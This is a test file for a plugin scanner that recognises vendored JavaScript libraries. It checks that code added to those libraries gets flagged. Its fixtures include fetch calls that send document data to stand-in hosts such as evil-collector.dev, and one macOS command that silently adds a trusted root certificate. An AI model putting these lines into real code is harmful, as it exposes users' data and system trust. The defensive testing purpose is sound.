import { describe, expect, it } from "vitest";
import { indexFromSources } from "../src/libs/index.ts";
import { callKey, collect } from "../src/libs/normalize.ts";
import { parseJs } from "../src/libs/parse.ts";
import { readTar } from "../src/libs/reference.ts";
import { hostIn, scanFiles } from "./helpers/scan.ts";

/** The key of the first call in a statement. */
const key = (code: string) => collect(parseJs(code)).calls[0]?.key ?? "";
const specific = (code: string) => collect(parseJs(code)).calls[0]?.specific;

describe("call normaliser", () => {
  it("gives one key to the forms two minifiers write", () => {
    expect(key("f(33===r.Type)")).toBe(key("f(r.Type===33)"));
    expect(key("f(!0)")).toBe(key("f(true)"));
    expect(key("f(!1)")).toBe(key("f(false)"));
    expect(key('f(-1===s.indexOf("abcd"))')).toBe(key('f(s.indexOf("abcd")===-1)'));
    expect(key('f("ab"+"cd")')).toBe(key('f("abcd")'));
    expect(key("f(void 0)")).toBe(key("f(undefined)"));
    expect(key("a.send(b, c)")).toBe(key("longName.send(other, third)"));
  });

  it("keeps what a call does apart", () => {
    expect(key("a.open(b)")).not.toBe(key("a.send(b)"));
    expect(key('a.open("GET")')).not.toBe(key('a.open("POST")'));
    expect(key("fetch(a)")).not.toBe(key("other(a)"));
  });

  it("collapses nested functions and caps long keys", () => {
    expect(key("a.on('x', function (e) { return e.foo.bar.baz(); })")).toBe(
      key("a.on('x', (t) => { t.other(); })"),
    );
    const long = `f(${Array.from({ length: 300 }, (_, i) => `a${i}.b${i}`).join(",")})`;
    expect(key(long).endsWith("…")).toBe(true);
    expect(callKey(parseJs("f(a)").body as never)).toBeTypeOf("string");
  });

  it("marks calls that carry enough names to be one library's", () => {
    expect(specific('$.open("POST",$.options.upload.url)')).toBe(true);
    expect(specific('$.open("GET",$,false)')).toBe(false);
    expect(specific("fetch($)")).toBe(false);
  });

  it("keeps a plain-string form of a call that holds a template with nothing in it", () => {
    const [template] = collect(parseJs("f(`abcd\nefgh`)")).calls;
    const [string] = collect(parseJs('f("abcd\\nefgh")')).calls;
    expect(template?.key).not.toBe(string?.key);
    expect(template?.plainKey).toBe(string?.key);
    expect(string?.plainKey).toBeUndefined();
    expect(collect(parseJs("f(`abcd$" + "{x}`)")).calls[0]?.plainKey).toBeUndefined();
  });

  it("records where calls and functions nest", () => {
    const code = "function f() { a(b(1)); } c(function () { d(); });";
    const { calls, fns } = collect(parseJs(code), 100);
    expect(calls.map((c) => [c.parent, c.fn])).toEqual([
      [-1, 0],
      [0, 0],
      [-1, -1],
      [2, 1],
    ]);
    expect(fns).toHaveLength(2);
    expect(calls[0]?.start).toBe(100 + code.indexOf("a(b"));
  });
});

describe("tar reader", () => {
  const block = (name: string, data: Buffer, type = "0", prefix = "") => {
    const header = Buffer.alloc(512);
    header.write(name, 0);
    header.write(`${data.length.toString(8).padStart(11, "0")}\0`, 124);
    header.write(type, 156);
    header.write(prefix, 345);
    return Buffer.concat([header, data, Buffer.alloc((512 - (data.length % 512)) % 512)]);
  };

  it("reads long names, pax paths, prefixes and skips other entries", () => {
    const longName = `package/${"deep/".repeat(30)}file.js`;
    const tar = Buffer.concat([
      block("package/index.js", Buffer.from("one")),
      block("././@LongLink", Buffer.from(`${longName}\0`), "L"),
      block("short", Buffer.from("two")),
      block("PaxHeader", Buffer.from("30 path=package/from/pax.js\n"), "x"),
      block("short2", Buffer.from("three")),
      block("package/link", Buffer.alloc(0), "2"),
      block("name.js", Buffer.from("four"), "0", "package/with/prefix"),
      Buffer.alloc(1024),
    ]);
    expect(readTar(tar).map((e) => [e.name, e.data.toString()])).toEqual([
      ["package/index.js", "one"],
      [longName, "two"],
      ["package/from/pax.js", "three"],
      ["package/with/prefix/name.js", "four"],
    ]);
  });
});

// A library with enough distinct calls to be recognised on content alone, and a loader that
// sends a file somewhere its options name.
function libSource(
  names: Record<string, string>,
  extraInLoader = "",
  upload = "options.upload.url",
  hook = "q.step1(); q.step2(); q.step3();",
) {
  const { api, opts, e, x, d } = names;
  const lines = Array.from(
    { length: 40 },
    (_, i) => `  ${api}.registerWidget("widget-name-${i}", ${opts}.widgets.item${i});`,
  ).join("\n");
  return `var ${api} = {};
var ${opts} = {};
${lines}
function load(${e}, ${d}) {
  var ${x} = new XMLHttpRequest();
  ${x}.open("POST", ${upload.startsWith('"') ? upload : `${e}.${upload}`});
  ${x}.setRequestHeader("X-Upload-Token", ${e}.options.upload.token);
${extraInLoader}
  ${x}.send(${d});
}
${api}.hooks.onReady("start-up-hook", function () { ${hook} });
${api}.load = load;
`;
}
const original = { api: "api", opts: "opts", e: "e", x: "x", d: "d" };
const renamed = { api: "q", opts: "o", e: "t", x: "n", d: "r" };
const libraries = () => indexFromSources({ libx: [libSource(original)] });

describe("library fingerprints in the scanner", () => {
  it("takes a re-minified copy as the library, whatever the file is called", async () => {
    const r = await scanFiles(
      { "content/editor.js": libSource(renamed) },
      { libraries: libraries() },
    );
    const xhr = r.analysis.network.apis.find((a) => a.api === "xhr");
    expect(xhr?.inVendoredCodeOnly).toBe(true);
    expect(r.analysis.transparency.vendoredLibraries).toEqual([
      expect.objectContaining({
        name: "libx",
        identifiedBy: "hash",
        match: "release",
        files: ["content/editor.js"],
      }),
    ]);
  });

  it("scans code added next to a library call as the plugin's own", async () => {
    const tampered = libSource(
      renamed,
      '    fetch("https://evil-collector.dev/collect?d=" + encodeURIComponent(document.title));',
    );
    const r = await scanFiles({ "content/editor.js": tampered }, { libraries: libraries() });
    expect(hostIn(r, "evil-collector.dev")?.inVendoredCode).toBe(false);
    expect(r.analysis.network.apis.find((a) => a.api === "fetch")?.inVendoredCodeOnly).toBe(false);
    const libx = r.analysis.transparency.vendoredLibraries.find((v) => v.name === "libx");
    expect(libx?.match).toBe("partial");
    expect(libx?.unmatched).toContainEqual(
      expect.objectContaining({
        file: "content/editor.js",
        snippet: expect.stringContaining("evil-collector.dev"),
      }),
    );
  });

  it("scans a function handed to a library call as the plugin's own", async () => {
    const own = libSource(
      renamed,
      "",
      "options.upload.url",
      'fetch("https://hidden-service.org/x");',
    );
    const r = await scanFiles({ "content/editor.js": own }, { libraries: libraries() });
    expect(hostIn(r, "hidden-service.org")?.inVendoredCode).toBe(false);
  });

  it("scans a library call whose argument was changed as the plugin's own", async () => {
    const changed = libSource(renamed, "", '"https://collector-service.net/u"');
    const r = await scanFiles({ "content/editor.js": changed }, { libraries: libraries() });
    expect(hostIn(r, "collector-service.net")?.inVendoredCode).toBe(false);
    expect(r.analysis.transparency.vendoredLibraries.find((v) => v.name === "libx")?.match).toBe(
      "partial",
    );
  });

  it("keeps a bundler-marked module of the plugin's own out of a library the bundle opens with (banyan)", async () => {
    // The plugin's functions here are made of plain calls the library's release has too
    // (`go()`), so by calls alone they look like the library's, and the setting that gates the
    // code they call would be lost.
    const release = `${libSource(original)}\nfunction extra() { go(); }`;
    const index = indexFromSources({ libx: [release] });
    const go = "go(); go(); go(); go();";
    const bundle = `// node_modules/libx/dist/index.js
${release}
// src/trust.ts
async function trust() {
  await Subprocess.call({ command: "/usr/bin/security", arguments: ["add-trusted-cert", "-d", "-r", "trustRoot", ca] }); }
async function initProxy() { ${go}
  if (!Zotero.isMac || !getPref("httpsProxyEnabled")) return null;
  await trust(); }
async function startup() { ${go} await initProxy(); }
`;
    const settings = (r: Awaited<ReturnType<typeof scanFiles>>) =>
      r.analysis.capabilities.find((c) => c.id === "changes-settings")?.details?.settings;
    const files = {
      "prefs.js": 'pref("extensions.zotero.fixture.httpsProxyEnabled", false);',
      "content/bundle.js": bundle,
    };
    const expected = [
      {
        change: "certificate",
        target: "macOS",
        asks: "none",
        auto: true,
        setting: "httpsProxyEnabled",
      },
    ];
    expect(settings(await scanFiles(files))).toEqual(expected);
    expect(settings(await scanFiles(files, { libraries: index }))).toEqual(expected);
  });

  it("calls a library partial only where a finding in it failed the check", async () => {
    const quiet = libSource(renamed, '    helper("a call the release lacks", 1);');
    const r = await scanFiles({ "content/editor.js": quiet }, { libraries: libraries() });
    const libx = (x: typeof r) =>
      x.analysis.transparency.vendoredLibraries.find((v) => v.name === "libx");
    expect(libx(r)?.match).toBe("release");
    expect(libx(r)?.unmatched).toBeUndefined();
    const loud = libSource(renamed, '    fetch("https://evil-collector.dev/c");');
    const t = await scanFiles({ "content/editor.js": loud }, { libraries: libraries() });
    expect(libx(t)?.match).toBe("partial");
  });

  it("charges a failed finding to the library that claimed the code, not to every one in the file", async () => {
    const other = Array.from(
      { length: 40 },
      (_, i) => `zed.registerGadget("gadget-name-${i}", conf.gadgets.item${i});`,
    ).join("\n");
    const index = indexFromSources({ libx: [libSource(original)], liby: [other] });
    const tampered = libSource(
      renamed,
      '    fetch("https://evil-collector.dev/collect?d=" + encodeURIComponent(document.title));',
    );
    const bundle = `// node_modules/libx/dist/index.js\n${tampered}\n// node_modules/liby/dist/index.js\n${other}\n`;
    const r = await scanFiles({ "content/bundle.js": bundle }, { libraries: index });
    const found = (name: string) =>
      r.analysis.transparency.vendoredLibraries.find((v) => v.name === name);
    expect(found("libx")?.match).toBe("partial");
    expect(found("liby")?.match).toBe("release");
  });

  it("takes a string with a line break as the library's however a minifier wrote it", async () => {
    // One build keeps it as a string, the other (esbuild) turns it into a template.
    const message = 'tip.el.show("See https://docs.libx-site.org/guide for\\nhelp");';
    const asTemplate = "tip.el.show(`See https://docs.libx-site.org/guide for\nhelp`);";
    const release = `${libSource(original)}\nfunction hint(tip) { ${message} }`;
    const index = indexFromSources({ libx: [release] });
    const copy = `${libSource(renamed)}\nfunction hint(t) { ${asTemplate.replace("tip", "t")} }`;
    const r = await scanFiles({ "content/editor.js": copy }, { libraries: index });
    expect(hostIn(r, "docs.libx-site.org")?.inVendoredCode).toBe(true);
    expect(r.analysis.transparency.vendoredLibraries[0]?.match).toBe("release");
    // A different message in the same place is the plugin's own.
    const changed = copy.replace("for\nhelp", "for\nmore");
    const c = await scanFiles({ "content/editor.js": changed }, { libraries: index });
    expect(hostIn(c, "docs.libx-site.org")?.inVendoredCode).toBe(false);
  });

  it("takes a long message of the release's in a one-line method as the library's", async () => {
    const own =
      'function a(){ throw new Error("need the options first, see https://docs.libx-site.org/opts"); }';
    const release = `${libSource(original)}\napi.fail = ${own.replace("function a", "function ")};`;
    const index = indexFromSources({ libx: [release] });
    const copy = `${libSource(renamed)}\nq.fail = ${own.replace("function a", "function ")};`;
    const r = await scanFiles({ "content/editor.js": copy }, { libraries: index });
    expect(hostIn(r, "docs.libx-site.org")?.inVendoredCode).toBe(true);
    // The same function with another message is not the release's.
    const changed = copy.replace("need the options first", "need other options first");
    const c = await scanFiles({ "content/editor.js": changed }, { libraries: index });
    expect(hostIn(c, "docs.libx-site.org")?.inVendoredCode).toBe(false);
  });

  it("doesn't take a file's name as proof it is the library", async () => {
    const own = 'fetch("https://own-service.org/x");\n';
    const files = { "vendor/libx.min.js": own };
    const checked = await scanFiles(files, { libraries: libraries() });
    expect(hostIn(checked, "own-service.org")?.inVendoredCode).toBe(false);
    expect(checked.analysis.network.apis.find((a) => a.api === "fetch")?.inVendoredCodeOnly).toBe(
      false,
    );
    // Without the catalogue the name is taken as it always was.
    const unchecked = await scanFiles(files);
    expect(hostIn(unchecked, "own-service.org")?.inVendoredCode).toBe(true);
    expect(unchecked.analysis.transparency.vendoredLibraries[0]).toEqual({
      name: "libx",
      files: ["vendor/libx.min.js"],
      identifiedBy: "file-name",
    });
  });

  it("still checks a file named like a catalogued library for minified own code", async () => {
    const minified = "var a=f(1,2);".repeat(800);
    const files = { "vendor/libx.min.js": minified, "content/plain.js": "var a = 1;\n" };
    const checked = await scanFiles(files, { libraries: libraries() });
    expect(checked.analysis.transparency.minifiedFiles).toEqual(["vendor/libx.min.js"]);
    // Without the catalogue the name is taken as it always was.
    const unchecked = await scanFiles(files);
    expect(unchecked.analysis.transparency.minifiedFiles).toEqual([]);
  });

  it("keeps the old behaviour for a library that isn't in the catalogue", async () => {
    const files = { "vendor/other.min.js": 'fetch("https://own-service.org/x");\n' };
    const r = await scanFiles(files, { libraries: libraries() });
    expect(hostIn(r, "own-service.org")?.inVendoredCode).toBe(true);
    expect(r.analysis.transparency.vendoredLibraries[0]).toMatchObject({
      name: "other",
      match: "not-in-catalogue",
    });
  });

  it("does nothing without an index", async () => {
    const r = await scanFiles({ "content/editor.js": libSource(renamed) });
    expect(r.analysis.network.apis.find((a) => a.api === "xhr")?.inVendoredCodeOnly).toBe(false);
    expect(r.analysis.transparency.vendoredLibraries).toEqual([]);
  });
});
